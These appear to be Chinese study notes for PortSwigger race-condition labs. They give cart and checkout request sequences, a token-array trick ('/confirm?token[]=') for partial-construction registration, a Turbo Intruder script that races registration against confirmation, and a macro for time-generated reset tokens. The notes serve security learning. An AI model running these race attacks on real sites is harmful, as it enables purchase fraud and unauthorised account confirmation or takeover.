### 多端点竞态条件

实验：多端点竞态条件
https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint

添加礼品卡到购物车
POST /cart HTTP/2
productId=2&redir=PRODUCT&quantity=1

结账
POST /cart/checkout HTTP/2

添加目标商品到购物车
POST /cart HTTP/2
productId=1&redir=PRODUCT&quantity=1

单连接顺序进行时：
结账-添加 结账完成后目标商品才添加到购物车，太迟。
添加-结账 添加后才结账，太早。

单包并行时：
1结账-1添加 对礼品卡结账，目标商品未添加。      不存在于购物车，已经进入状态机，但仍不足。
9结账-1添加 对4礼品卡结账3次，目标商品未添加。  此时存在竞态条件，但未达主要目的。
5结账-1添加 对5礼品卡结账5次，目标商品未添加。  
2结账-5添加 重复几次后成功，对2礼品卡与2目标商品结账2次。

### 部分构造竞态条件

实验：部分构建竞态条件
https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction

示例解决方案：
对注册页面的请求
GET /register HTTP/2
相应页面包含
```html
<script src='/resources/static/users.js'></script>
<script>createRegistrationForm()</script>
```
对包含脚本的请求
GET /resources/static/users.js HTTP/2

响应中泄露了并未被当前页面调用的对内容的确认脚本为：
```javascript
const parts = window.location.href.split("?");
const query = parts.length == 2 ? parts[1] : "";
const action = query.includes('token') ? query : "";

const form = document.createElement('form');
form.method = 'POST';
form.action = '/confirm?' + action;
```
当url包含查询字符串，且其中包含token字符串时，向 /confirm 拼接并提交 
/confirm?token=test
得到
"Incorrect token: test"

提交
/confirm?token=
得到
"Forbidden"

提交
/confirm?token[]=
得到
"Incorrect token: Array"
空数组，可能会匹配一个未初始化的注册 token

在重复器中分组同步发送时发现，注册用时长于确认

``````python
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )
    
    confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: phpsessionid=YOUR-SESSION-TOKEN
Content-Length: 0

'''
    # 设置重复次数
    for attempt in range(20):
        currentAttempt = str(attempt)
        # 设置不重复的用户名
        username = 'User' + currentAttempt
    
        # queue a single registration request
        engine.queue(target.req, username, gate=currentAttempt)
        
        # queue 50 confirmation requests - note that this will probably sent in two separate packets
        for i in range(50):
            engine.queue(confirmationReq, gate=currentAttempt)
        
        # send all the queued requests for this attempt
        engine.openGate(currentAttempt)

``````

### 时间敏感攻击

实验：利用时间敏感漏洞
https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities

示例解决方案：
观察到应用程序使用php会话令牌，请求将按顺序执行而不是并发。
在burp组并行发送中，响应时间存在延迟。
使用一组新的会话令牌与反csrf令牌，此时延迟为0或很小。
在于应用程序使用时间生成的重置令牌，且应用了单php会话令牌的顺序执行。
录制宏在发送重置post后，get邮箱并提取token，使用token访问重置url
